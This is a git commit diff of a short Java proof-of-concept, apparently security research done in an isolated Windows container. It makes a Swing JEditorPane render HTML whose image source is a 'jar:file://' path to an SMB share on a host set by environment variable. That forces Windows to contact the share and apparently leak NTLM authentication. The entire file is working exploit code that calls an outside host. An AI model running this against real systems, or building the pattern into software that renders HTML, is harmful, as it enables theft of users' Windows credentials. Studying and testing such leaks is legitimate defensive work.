18ff6bdf6dd0c4d0ff810a43f3a960eea8eb89c7
sealldeveloper-aidr2 <umgdl71fvon28qmf--githubaidr2-1785896221@oob.blackmail.zip>
2026-08-17 04:49:35 +0000

    capture SMB in isolated Windows container

--- SwingWindowsProof.java
+++ SwingWindowsProof.java
@@ -1,8 +1,9 @@
 import javax.swing.*;
 public class SwingWindowsProof {
  public static void main(String[] args) throws Exception {
-   System.out.println("os="+System.getProperty("os.name")+" host="+System.getenv("COMPUTERNAME")+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
-   String html="<html><body><img src='http://localhost:18087/ntlm-image'></body></html>";
+   String host=System.getenv("SMBHOST");
+   System.out.println("os="+System.getProperty("os.name")+" smbhost="+host+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
+   String html="<html><body><img src='jar:file://"+host+"/SHARE/nonexistent.jar!/x.png'></body></html>";
    SwingUtilities.invokeAndWait(() -> { JEditorPane pane=new JEditorPane("text/html",html); JFrame frame=new JFrame("proof"); frame.add(pane); frame.setSize(500,500); frame.setVisible(true); System.out.println("Rendered frame: "+html); });
    Thread.sleep(25000); System.out.println("done"); System.exit(0);
  }
